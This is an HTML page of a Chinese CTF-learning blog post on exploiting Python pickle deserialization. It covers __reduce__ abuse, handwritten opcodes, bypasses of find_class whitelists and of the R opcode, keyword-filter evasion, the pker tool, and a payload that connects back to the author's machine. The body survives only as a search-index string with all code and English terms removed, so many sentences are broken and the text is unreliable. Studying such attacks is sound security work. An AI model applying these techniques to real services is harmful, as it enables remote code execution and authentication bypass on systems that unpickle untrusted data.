<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>Pickle反序列化 | hybcx</title><meta name="keywords" content="基本知识"><meta name="author" content="hybcx,19815455497@163.com"><meta name="copyright" content="hybcx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="Pickle反序列化"><meta name="application-name" content="Pickle反序列化"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="Pickle反序列化"><meta property="og:url" content="http://hybcx.xyz/2023/11/14/pickle-fan-xu-lie-hua-xue-xi/index.html"><meta property="og:site_name" content="hybcx"><meta property="og:description" content="0x01 前言 之前学的反序列化一直是围绕PHP的，近期刷题也遇到pickle反序列化，故此学习一番，唉，Python反序列化都难，更别说Java了┭┮﹏┭┮ 0x02 简介 Python的序列化和反序列化是将一个类对象向字节流转化从而进行存储和传输, 然后使用的时候再将字节流转化回原始的对象的一个"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta property="article:author" content="hybcx"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta name="description" content="0x01 前言 之前学的反序列化一直是围绕PHP的，近期刷题也遇到pickle反序列化，故此学习一番，唉，Python反序列化都难，更别说Java了┭┮﹏┭┮ 0x02 简介 Python的序列化和反序列化是将一个类对象向字节流转化从而进行存储和传输, 然后使用的时候再将字节流转化回原始的对象的一个"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://hybcx.xyz/2023/11/14/pickle-fan-xu-lie-hua-xue-xi/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?d98ea8480e5ec98a243adfc7bd46b93a";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = {
  linkPageTop: {"enable":true,"title":"向✌们无限学习","addFriendPlaceholder":"昵称（请勿包含博客等字样）：\n网站地址（要求博客地址，请勿提交个人主页）：\n头像图片url（请提供尽可能清晰的图片，我会上传到我自己的图床）：\n描述：\n站点截图（可选）：\n"},
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: {"enable":true,"ck":"3JLPGIZJOJw6Nvu2","LingQueMonitorID":"3JLPOLHV5W6IAty5"},
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: {"appId":"Z7A3XW4R2I","apiKey":"12db1ad54372045549ef465881c17e743","indexName":"my-hexo-blog","hits":{"per_page":6},"languages":{"input_placeholder":"输入关键词后按下回车查找","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: hybcx","link":"链接: ","source":"来源: hybcx","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'hybcx',
  title: 'Pickle反序列化',
  postAI: '',
  pageFillDescription: '0x01 前言, 0x02 简介, 0x03 Pickle, 3.1 基础知识, 3.2 可序列化的对象, 3.3 object.__reduce__() 函数, 3.4 魔术方法, __reduce__(), __setstate__(), __getstate__(), 3.5 简单使用, 3.5.1 序列化操作, 3.5.2 反序列化操作, 0x04 Pickle过程详细解读, 4.1 执行流程, 4.2 opcode简介, 4.3 指令集, 4.4 Pickletools, 4.5 例子-文字说明, 0x05 漏洞利用, 5.1 漏洞原理, 5.2 利用思路, 5.3 初步认识：pickle EXP的简单demo, 5.4 如何手写opcode, 5.4.1 常用opcode解析, 5.4.2 拼接opcode, 全局变量覆盖, 函数执行, 实例化对象, pker的使用（推荐）, 注意事项, 5.4.3 CTF实战, 做题之前：了解pickle.Unpickler.find_class(), 绕过builtins, Code-Breakingpicklecode, 高校战疫网络安全分享赛webtmp, CTF-case1, 0x06 Marshal 反序列化, 0x07 Pass总结, 7.1 绕过builtins, 思路一, 思路二, 7.2 绕过R指令, i指令, o指令, b指令, 7.3 绕过关键字过滤, 利用V指令进行Unicode绕过, 十六进制绕过, 利用内置函数获取关键字, 0x08 pker使用说明, 8.1 简介, 8.2 pker能做的事, 8.3 使用方法与示例, pker：全局变量覆盖, pker：函数执行, pker：实例化对象, 8.4 CTF实战, [CISCN2019 华北赛区 Day1 Web2]ikun, Bandit-自动化工具, [watevrCTF-2019]Pickle Store, 0x09 参考文章前言之前学的反序列化一直是围绕的近期刷题也遇到反序列化故此学习一番唉反序列化都难更别说了简介的序列化和反序列化是将一个类对象向字节流转化从而进行存储和传输然后使用的时候再将字节流转化回原始的对象的一个过程这个和其他语言的序列化与反序列化其实都差不多中序列化一般有两种方式模块和模块前者是特有的格式后者是通用的格式相较于反序列化灵活多样的利用方式例如链构造反序列化原生类反序列化以及字符逃逸等相对而言没有那么灵活关于反序列化漏洞主要涉及这么几个概念魔术方法基础知识可以用于特有的类型和的数据类型间进行转换所有数据类型提供两个模块来实现序列化和这两个模块功能是一样的区别在于是语言写的速度快是纯写的速度慢在中已经没有模块有如下四种操作方法函数说明对象序列化到文件对象并存入文件对象序列化为对象字符串格式的字节流对象反序列化并从文件中读取数据从对象字符串格式的字节流反序列化将打包好的对象写入文件中其中为的协议版本下同将打包以后的对象作为类型直接返回从文件中读取二进制字节流将其反序列化为一个对象并返回从中读取二进制字节流将其反序列化为一个对象并返回其实是类中的一个魔术方法我们可以通过重写类的函数使之在被实例化时按照重写的方式进行要求该方法必须返回一个字符串或者元组如果返回元组那么每当该类的对象被反序列化时该就会被调用参数为这里在强调一下这个基础知识与类似也有序列化功能以长期储存内存中的数据是下的序列化与反序列化包有另一个更原始的序列化包现在开发时一般使用与相比以二进制储存不易人工阅读可以跨语言而是专用的能表示几乎所有的类型包括自定义类型只能表示一部分内置类型且不能表示自定义类型实际上可以看作一种独立的语言通过对的更改编写可以执行代码覆盖变量等操作直接编写的灵活性比使用序列化生成的代码更高有的代码不能通过序列化得到解析能力大于生成能力可序列化的对象和整数浮点数复数只包含可封存对象的集合包括和定义在模块最外层的函数使用定义函数则不可以定义在模块最外层的内置函数定义在模块最外层的类属性值或函数的返回值可以被序列化的类详见官方文档的函数在开发时可以通过重写类的函数使之在被实例化时按照重写的方式进行具体而言要求返回一个的元组每当该类的对象被时该就会被调用以生成对象该其实是构造函数在下文的中的作用与关系密切选择栈上的第一个对象作为函数第二个对象作为参数第二个对象必须为元组然后调用该函数其实正好对应函数的返回值会作为的作用对象当包含该函数的对象被序列化时得到的字符串是包含了的魔术方法反序列化时调用反序列化时调用上面的升级版反序列化时调用序列化时调用这里用一个小迪的来体会一下上述魔术方法的作用反序列化魔术方法调用反序列化调用上述先实例化一个对象接着对对象进行序列化然后对序列化后的字节流数据进行反序列化最后打印出序列化后的字节流数据注意这里的魔术方法在反序列化时也就是调用函数时会被自动调用随后打印一段字符接着调用执行命令结果如下图我们将上述注释掉会发现没有调用计算器但却执行了中的函数这里我就懵逼了不是说只有反序列化时才会调用方法吗接着问了一下发现在进行时会尝试调用方法以获取序列化信息因此会执行函数但在此阶段其并不会执行返回的可调用对象和其他参数只是单纯的获取这些信息用于后续的反序列化操作这里有一个注意点就是的部分是必须要返回一个字符串或者是元组的否则就会报错如下图不过一个懵逼的点是我将上述后面的逗号去掉之后虽然报错但依旧执行了命令暂不清楚原因构造函数的定义构造方法恶意代码序列化反序列化此时会弹出计算器这里在反序列化时会自动调用魔术方法进而执行命令如下图成功验证但此函数的优先级低于且是静态方法序列化魔术方法调用序列化调用该函数会在序列化时自动调用如下图成功验证简单使用序列化操作代码在与下的运行结果如上图所示输出的一大串字符实际上是一串操作码可以在中看到关于这些操作码的详解反序列化操作序列化反序列化过程详细解读解析依靠进行涉及到三个部分解析引擎栈内存解析引擎从流中读取和参数并对其进行解释处理重复这个动作直到遇到停止最终留在栈顶的值将被作为反序列化对象返回栈由的实现被用来临时存储数据参数以及对象由的实现为的生命周期提供存储说人话将反序列化完成的数据以的形式储存在中以便后来使用为了便于理解师傅把讲稿中的相关部分制成了动图解析的过程动图解析的过程动图执行流程首先会把源代码编译成字节码字节码是语言特有的一种表现形式它不是二进制机器码需要进一步编译才能被机器执行如果进程在主机上有写入权限那么它会把程序字节码保存为一个以为扩展名的文件如果没有写入权限则进程会在内存中生成字节码在程序执行结束后被自动丢弃一般来说在构建程序时最好给进程在主机上的写入权限这样只要源代码没有改变生成的文件就可以被重复利用提高执行效率同时隐藏源代码然后进程会把编译好的字节码转发到虚拟机中会循环迭代执行字节码指令直到所有操作被完成简介由于有不同的实现版本在和中得到的不相同但是可以向下兼容所以用就可以在所有版本中执行目前有种版本原变量输出的值版本输出原变量版本版本版本版本版本的示例协议头声明协议版本数据长度数据储存栈顶的字符串长度一个字节即栈顶位置数据截止版本的部分表格本表格截取了的上的部分内容完整表格可以直接在原中找到指令集当前用于的协议共有种使用的协议版本越高读取生成的所需的版本就要越新版协议是原始的人类可读协议并且向后兼容早期版本的版协议是较早的二进制格式它也与早期版本的兼容版协议是在中引入的它为存储提供了更高效的机制参阅版协议添加于它具有对对象的显式支持且无法被打开这是目前默认使用的协议也是在要求与其他版本兼容时的推荐协议版协议添加于它支持存储非常大的对象能存储更多种类的对象还包括一些针对数据格式的优化参阅版协议添加于它支持带外数据加速带内数据处理上文谈到了是有多个版本的在进行序列化时可以通过来选择的版本指定的版本必须小于等于使用可以方便的将转化为便于肉眼读取的形式例子文字说明这里翻到其他文章采用了文字叙述的方式介绍了一个简单的例子这里用一段简短的字节码来演示利用过程上文中的字节码其实就是下面来分解分析一下引入模块引用并将其添加到把当前存到清空再将压入中的值弹出并转为把还原到再将压入结束并返回当前栈顶元素需要注意的是并不是所有的对象都能使用进行序列化和反序列化例如文件对象和网络套接字对象以及代码对象就不可以漏洞利用漏洞原理漏洞产生的原因在于其可以将自定义的类进行序列化和反序列化反序列化后产生的对象会在结束时触发函数从而触发恶意代码简单来说魔术方法类似于中的方法在反序列化时会先调用魔术方法如果返回值是一个字符串那么将会去当前作用域中查找字符串值对应名字的对象将其序列化之后返回如果返回值是一个元组要求是到个参数新加入元组的第六项第一个参数是可调用的对象第二个是该对象所需的参数元组如果可调用对象不接受参数则必须提供一个空元组第三个是用于表示对象的状态的可选元素将被传给前述的方法如果对象没有此方法则这个元素必须是字典类型并会被添加至属性中第四个是用于返回连续项的迭代器的可选元素第五个是用于返回连续键值对的迭代器的可选元素第六个是一个带有签名的可调用对象的可选元素这里依旧展示一下小迪的浅浅了解反序列化漏洞的为何会产生反序列化安全漏洞产生定义构造函数将传入的参数进行了赋值定义方法这里将传入的参数分别当做了函数及参数反序列化调用很明显如果我们此时运行程序的话就会执行命令这也就是说我们可以传入一些带恶意数据的序列化字符串将其传入到某个具有反序列化功能的点那就会执行我们的恶意数据可以进一步开展后续工作了利用思路任意代码执行或命令执行变量覆盖通过覆盖一些凭证达到绕过身份验证的目的初步认识的简单要执行的命令函数必须返回元组或字符串此时如果就会执行命令变量覆盖输出如何手写在中很多时候需要一次执行多个函数或一次进行多个指令此时就不能光用来解决问题一次只能执行一个函数当被禁用时就不能一次执行多条指令了而需要手动拼接或构造了手写是反序列化比较难的地方在这里可以体会到为何是一种语言直接编写的灵活性比使用序列化生成的代码更高只要符合语法就可以进行变量覆盖函数执行等操作根据前文不同版本的可以看出版本的更方便阅读所以手动编写时一般选用版本的下文中所有为版本的常用解析为了充分理解栈的作用强烈建议一边看动图一边学习的作用由于库中的注释不是很详细网上的其他资料也没有具体地把栈和上的变化讲清楚以下的每个的操作都是师傅经过实验验证并且尽可能将栈和上的变化解释清楚常用的如下描述具体写法栈上的变化上的变化获取一个全局对象或一个模块注会调用语句能够引入新的包获得的对象入栈无寻找栈中的上一个以之间的第一个数据必须为函数为第二个到第个数据为参数执行该函数或实例化一个对象这个过程中涉及到的数据都出栈函数的返回值或生成的对象入栈无相当于和的组合先获取一个全局函数然后寻找栈中的上一个并组合之间的数据为元组以该元组为参数执行全局函数或实例化一个对象这个过程中涉及到的数据都出栈函数返回值或生成的对象入栈无实例化一个获得的对象入栈无实例化一个字符串对象也可以使用双引号等字符串形式获得的对象入栈无实例化一个字符串对象获得的对象入栈无实例化一个对象获得的对象入栈无实例化一个对象获得的对象入栈无选择栈上的第一个对象作为函数第二个对象作为参数第二个对象必须为元组然后调用该函数函数和参数出栈函数的返回值入栈无程序结束栈顶的一个元素作为的返回值无无向栈中压入一个标记标记入栈无寻找栈中的上一个并组合之间的数据为元组标记以及被组合的数据出栈获得的对象入栈无向栈中直接压入一个空元组空元组入栈无寻找栈中的上一个并组合之间的数据为列表标记以及被组合的数据出栈获得的对象入栈无向栈中直接压入一个空列表空列表入栈无寻找栈中的上一个并组合之间的数据为字典数据必须有偶数个即呈对标记以及被组合的数据出栈获得的对象入栈无向栈中直接压入一个空字典空字典入栈无将栈顶对象储存至无对象被储存将的对象压栈对象被压栈无丢弃栈顶对象栈顶对象被丢弃无使用栈中的第一个元素储存多个属性名属性值的字典对第二个元素对象实例进行属性设置栈上第一个元素出栈无将栈的第一个和第二个对象作为对添加或更新到栈的第三个对象必须为列表或字典列表以数字作为中第一二个元素出栈第三个元素列表或字典添加新值或被更新无寻找栈中的上一个组合之间的数据数据必须有偶数个即呈对并全部添加或更新到该之前的一个元素必须为字典中标记以及被组合的数据出栈字典被更新无将栈的第一个元素到第二个元素列表中栈顶元素出栈第二个元素列表被更新无寻找栈中的上一个组合之间的数据并到该之前的一个元素必须为列表中标记以及被组合的数据出栈列表被更新无此外可以用表示也可以用表示其他可以在库的源代码中找到由这些我们可以得到一些需要注意的地方编写时要想象栈中的数据以正确使用每种在理解时注意与本身的操作对照比如列表的对应对应字典的对应操作符会尝试库所以在时不需要漏洞代码中先引入系统库不支持列表索引字典索引点号取对象属性作为左值需要索引时只能先获取相应的函数如才能进行但是因为存在操作符作为右值是可以的即查值不行赋值可以能够索引查值的操作只有而如何查值也是的一个重要考点操作符可以构造并赋值原来没有的属性键值对拼接将第一个流结尾表示结束的去掉将第二个流与第一个拼接起来即可全局变量覆盖源码首先通过获取全局变量然后建立一个字典并使用对进行属性设置使用到的输出如下函数执行与函数执行相关的有三个所以我们可以从三个方向进行构造实例化对象实例化对象是一种特殊的函数执行这里简单的使用构造一下其他方式类似到这里已经基本熟练对于该手工构造了也能对每条语句看懂不过有点疑惑的就是最前面的对于上述表格的解释我还是有点懵懂只是感觉只是一个使后续的字符串成为一个对象的作用吧可能的使用推荐是由编写的以仿照的形式产生的解析器可以在下载源码解析器的原理见作者的通过来构造使用我们可以更方便地编写的使用方法将在下文中详细介绍需要注意的是建议在能够手写的情况下使用进行辅助编写不要过分依赖注意事项序列化的结果与操作系统有关使用构建的可能不能在上运行比如注意注意实战做题之前了解由于官方针对的安全问题的建议是修改引入白名单的方式来解决很多题都是针对该函数进行所以搞清楚如何绕过该函数很重要什么时候会调用从角度看当出现时会调用所以只要在这三个直接引入模块时没有违反规则即可从代码来看只会在解析时调用一次所以只要绕过执行过程就不会再调用也就是说只需要调用过一次通过之后再产生的函数在黑名单中也不会拦截所以可以通过绕过一些黑名单下面先看两个例子只允许模块第一个例子是官方文档中的例子使用白名单限制了能够调用的模块为第二个例子是高校战疫网络安全分享赛中的过滤方法只允许模块虽然看起来很安全但是被引入主程序的模块都可以通过调用修改所以造成了变量覆盖由这两个例子我们了解到对于开发者而言使用白名单谨慎列出安全的模块则是规避安全问题的方法而如何绕过函数内的限制就是反序列化解题的关键此外中的考察点往往还会结合的基础知识往往是内置的模块属性函数进行考察对白名单模块的熟悉程度所以做题的时候可以先把白名单模块的文档看一看绕过在一些例子中我们常常会见到这一限制比如官方文档中的例子只允许我们导入这一模块那么什么是模块呢当我们启动之后即使没有创建任何的变量或者函数还是会有许多函数可以使用如上述这类函数被我们称为内置函数这其实就是模块的功劳这些内置函数都是包含在模块内的而解释器在启动时已经自动帮我们导入了模块所以我们自然就可以使用这些内置函数了我们可以通过来查看该模块中包含的所有模块函数等大致如下题目将能够引入的模块限定为并且设置了子模块黑名单于是我们能够直接利用的模块有模块中黑名单外的子模块已经的模块需要先利用模块中的函数黑名单中没有所以可以通过获取或的子模块以及子模块的子模块而里有等危险函数即使在黑名单中也可以通过获得不能直接获取一级模块但可以通过获得这样就可以执行任意代码了我们可以借鉴沙箱逃逸的思路获取我们想要的函数代码没有禁用函数可以获取对象的属性值因此我们可以通过的形式来获取函数接下来我们得构造出一个模块来传给的第一个参数我们可以使用函数获取模块包含的内容可见模块中仍包含模块由于返回的结果是个字典所以我们还需要获取函数最终构造的为思路有了下面就是手写了首先获取函数结果如下然后获取字典结果如下安全学习现在我们有了有了字典把他们组合起来我们就能够获取模块了以上相当于执行了结果如下最后我们再调用获取到的的函数即可最终为这里附上的分析但解释的不太好让我们逐行解释上述数据块中的代码并说明每行之间的共同作用这个操作码表示使用模块这个操作码表示调用模块的函数这个操作码表示将接下来的值压入堆栈顶标记为位置这个操作码表示创建一个元组包含了模块共同作用和一起表示使用模块的函数结果此时堆栈顶部包含了一个表示函数的对象这个操作码表示创建一个空字典这个操作码表示将字符串压入堆栈这个操作码表示调用构造函数将键值对加入字典这里的键是字符串共同作用和一起表示创建一个字典其中包含了一个键值对键为结果此时堆栈顶部包含了一个字典这个操作码表示使用模块这个操作码表示调用模块的函数这个操作码表示调用构造函数将键值对加入字典这里的键是字符串共同作用和一起表示创建一个字典其中包含了两个键值对结果此时堆栈顶部包含了一个字典这个操作码表示将两个字典压入堆栈这个操作码表示创建一个元组包含了两个字典这个操作码表示将字符串压入堆栈这个操作码表示调用函数并将堆栈顶部的两个值作为参数传递给共同作用和一起表示使用函数导入模块结果此时堆栈顶部包含了模块的对象这个操作码表示将两个字典压入堆栈这个操作码表示创建一个元组包含了两个字典这个操作码表示将字符串压入堆栈这个操作码表示调用函数并将堆栈顶部的两个值作为参数传递给这个操作码表示创建一个元组包含了一个字符串其中包含了执行的代码这段代码尝试执行系统命令这个操作码表示调用函数并将堆栈顶部的两个值作为参数传递给最终结果根据函数的调用它会执行字符串中的代码即执行系统命令由于这段代码是恶意的它试图在系统上执行一个命令这可能会引发安全问题因此处理来自不受信任源的数据时要非常小心以防止潜在的安全风险这里用工具使用的话过程如下获取函数获取字典的方法获取方法获取字典获取模块获取函数高校战疫网络安全分享赛限制中改写了函数只能生成模块的只允许模块此外禁止了目标是覆盖中的验证由于被主程序引入是存在于下的模块中的所以可以直接覆盖掉此时就成功绕过了限制除了以上这些题外还有和四道题由于手动写还是比较麻烦在后文中使用工具完成上述的反序列化题目还是有难度的这里看小迪有一个简单的案例浅浅研究一下路由下的功能对中的参数进行的解码对参数反序列化将其中的对应的值赋值如果数据中没有键值则将赋值为指定字符串这里是开启环境的文件分析一波很明显就是我们要将参数传入并且还要进行编码那其中可控直接传入恶意序列化数据即可我们运行之后抓包接着我们编写一下输出这里我们对方法进行了重写最后的数据如果被反序列化那将会执行命令去尝试连接对应的如上图我们成功拿到那这里我们仍然可以继续编写使其功能完善直接在上对靶机进行请求不必使用我们做如下修改让其运行的时候自动访问靶机地址如下图执行成功不过这里有一个嫌疑就是该命令可以我再执行上述程序的时候反序列化的时候会自动调用方法便被调用因此我们可以本机开环境另一台主机执行上述如上图可以看到成功执行不过这里似乎需要注意版本问题上述环境是在下搭建的这里运行脚本似乎也需要在下运行因为我再下测试不成功反序列化由于无法序列化对象因此在后增加了一个模块来处理对象的序列化问题但是不能直接使用因为是利用调用某个并传递参数来执行的而函数本身就是一个需要执行它而不是将他作为某个函数的参数这时候就要利用上面分析的那个操作码来进行构造了先写出来需要执行的内容能通过来动态地创建匿名函数这一部分的内容可以看官方文档的介绍结合上文的示例代码最重要执行的是这里直接贴一下别的师傅给出来的模板总结绕过思路一这里上述的分析过该思路了这里我就直接了在一些例子中我们常常会见到这一限制比如官方文档中的例子只允许我们导入这一模块那么什么是模块呢当我们启动之后即使没有创建任何的变量或者函数还是会有许多函数可以使用如上述这类函数被我们称为内置函数这其实就是模块的功劳这些内置函数都是包含在模块内的而解释器在启动时已经自动帮我们导入了模块所以我们自然就可以使用这些内置函数了我们可以通过来查看该模块中包含的所有模块函数等大致如下题目将能够引入的模块限定为并且设置了子模块黑名单于是我们能够直接利用的模块有模块中黑名单外的子模块已经的模块需要先利用模块中的函数黑名单中没有所以可以通过获取或的子模块以及子模块的子模块而里有等危险函数即使在黑名单中也可以通过获得不能直接获取一级模块但可以通过获得这样就可以执行任意代码了我们可以借鉴沙箱逃逸的思路获取我们想要的函数代码没有禁用函数可以获取对象的属性值因此我们可以通过的形式来获取函数接下来我们得构造出一个模块来传给的第一个参数我们可以使用函数获取模块包含的内容可见模块中仍包含模块由于返回的结果是个字典所以我们还需要获取函数最终构造的为思路有了下面就是手写了首先获取函数结果如下然后获取字典结果如下安全学习现在我们有了有了字典把他们组合起来我们就能够获取模块了以上相当于执行了结果如下最后我们再调用获取到的的函数即可最终为这里附上的分析但解释的不太好思路二这里也是跟着佬学的他是通过全局变量中的直接进行的说明如下输出之后我们看到里面确实含有模块那我们可以尝试导入使用来绕过的限制但这里存在一些小问题这里直接放出佬的思考研究了不过值得注意的是由于的参数需要为类型而在中对于类型并没有很好的支持需要额外导入函数可能会导致无法绕过限制直到版本才引入了和两个字节码来标识类型可以看到此时对于类型变量的支持精简了很多所以当我们想利用来绕过时最好选择版本的构造下面我们就来一步步构造版本的首先获取函数输出其中有很多字节码实际测试去掉也是可以的构造思路和类似我们构造出函数这上述的构造真心看不懂接着我们生成要执行的由于函数接受的是类型参数为了方便构造我们先手动看一下的字节码方便我们后续构造这里使用了字节码代表类型然后后面跟上数据长度的十六进制即可我们将加粗部分和上文构造好的函数合并即可完整如下测试绕过思路二虽然相比思路一稍许麻烦但是我们通过构造来任意虽然会对字节码导入模块的时候进行检查但我们构造时并没有违反的规则并且当调用我们构造的字节码形式的时并不会触发所以只要我们能够构造出理论上我们是可以执行任意字节码的绕过指令以上方法虽然能够绕过对和一些危险函数的限制但本质上仍然是对函数的延伸倘若将字节码也禁用了那我们怎么进行呢如果你还记得我上文所说的漏洞命令执行的几种方法的话你肯定能立即想到和函数执行有关的字节码实际上如果没有指令我们同样能够进行函数执行有下面这样一个例子这里禁用了指令但是我们仍有方法初始化一个对象上文提到过使用指令实例化对象的过程实际上就是调用构造函数的过程本质上也是函数执行所以我们同样能够使用其他指令绕过指令相当于和的组合先获取一个全局函数然后寻找栈中的上一个并组合之间的数据为元组以该元组为参数执行全局函数或实例化一个对象指令寻找栈中的上一个以之间的第一个数据必须为函数为第二个到第个数据为参数执行该函数或实例化一个对象假如这里我们不知道模块的内容我们可以通过变量覆盖的方式将原有中的变量覆盖掉指令其实我们在上文已经使用过了指令当时他的作用是用来更新栈上的一个字典进行变量覆盖实际上官方对它的解释是当解析到指令时执行或者那什么是呢官方文档中如果想要存储对象的状态就可以使用和方法由于同样可以存储对象属性的状态所以这两个魔术方法主要是针对那些不可被序列化的状态如一个被打开的文件句柄我们来看下面的例子当对象被序列化时调用被反序列化时调用重写时可以省略但必须返回一个字典如果与都被省略那么就默认自动保存和加载对象的属性字典在源码中字节码对应的是函数首先获取栈上的字节码前的一个元素对于对象来说该元素一般是存储有对象属性的获取该字典中键名为的如果存在则执行如果为空则与对象默认的合并这一步其实就是将序列化前保存的持久化属性和对象属性字典合并如果和都没有设置则加载默认那么这有什么安全问题呢如果我们将字典压入栈中并执行字节码由于此时并没有所以这里字节码相当于执行了向对象的属性字典中添加了一对新的键值对如果我们继续向栈中压入命令再次执行字节码时由于已经有了所以会将栈中字节码的前一个元素当作执行也就是如下向栈中压入一个空字典然后再通过修改为执行结果如下成功绕过关键字过滤在某些情况下假如我们想利用进行变量覆盖从而进行身份伪造但是代码中过滤了我们想要覆盖的属性关键字比如强网杯关键代码如下源码引入模块其中存放了属性现在题目过滤了属性名现在如何进行绕过呢下面给出三种思路利用指令进行绕过指令的用法如下类似于指令正常我们可以构造变量覆盖如下来绕过比较过滤了之后可以构造如下十六进制绕过操作码也能够识别十六进制字符串可以构造如下利用内置函数获取关键字对于已导入的模块我们可以通过来获取该模块然后通过内置函数来列出模块中的所有属性可以看到模块中的属性是以列表的形式输出且我们所需的字符串位于列表末尾由于不支持列表索引字典索引所以我们不能直接获取所需的字符串在中我们可以通过函数来将列表逆序并返回一个迭代对象然后我们可以通过函数来获取迭代对象的下一个元素默认从第一个元素开始最终可以构造如下这类似的无参数构造如下获取到了字符串下面就容易构造变量覆盖了使用说明简介是由编写的以仿照的形式产生的解析器可以在下载源码使用我们可以更方便地编写生成版本的再次建议在能够手写的情况下使用进行辅助编写不要过分依赖此外的实现用到了的抽象语法树库抽象语法树也是一个很重要东西有兴趣的可以研究一下库和的源码由于篇幅限制这里不再叙述能做的事引用自变量赋值存到中保存下标和变量名即可函数调用类型字面量构造和成员修改对象成员变量修改具体来讲可以使用进行原变量覆盖函数执行实例化新的对象使用方法与示例中的针对的特殊语法需要重点掌握后文给出示例此外我们需要注意一点中的所有类模块包属性等都是对象这样便于对各操作进行理解主要用到三种特殊的函数以及一些必要的转换方式其他的也可以手动使用以下都可以是包含的子调用函数时注意传入的参数类型要和示例一致对应的会被生成但并不与代码相互等价对应获取下的一个全局对象没有的也可以比如下面的输入都是对应建立并入栈一个对象可以执行一个函数输入对应建立并入栈一个对象传入的第一个参数为可以执行一个函数输入对应使用参数调用函数先将函数入栈再将参数入栈并调用或对应更新列表或字典的某项的值对应对对象进行属性设置对应出栈作为函数的返回值注意一次只能返回一个对象或不返回对象就算用逗号隔开最后也只返回一个元组注意由于本身的功能问题肯定也不支持列表索引字典索引点号取对象属性作为左值需要索引时只能先获取相应的函数如才能进行但是因为存在操作符作为右值是可以的即查值不行赋值可以解析时用单引号包裹字符串所以代码中的双引号会被解析为单引号被解析为全局变量覆盖覆盖直接由执行文件引入的模块中的与变量的执行文件被解析为对象在该对象从属下覆盖引入模块的变量接下来会给出一些具体的基本操作的实例函数执行通过调用调用通过调用通过与调用多参数调用函数实例化对象实例化对象是一种特殊的函数执行或者其中原文件中包含也可以先实例化再赋值手动辅助拼接将第一个流结尾表示结束的去掉两者拼接起来即可建立普通的类时可以先再拼接至实战在实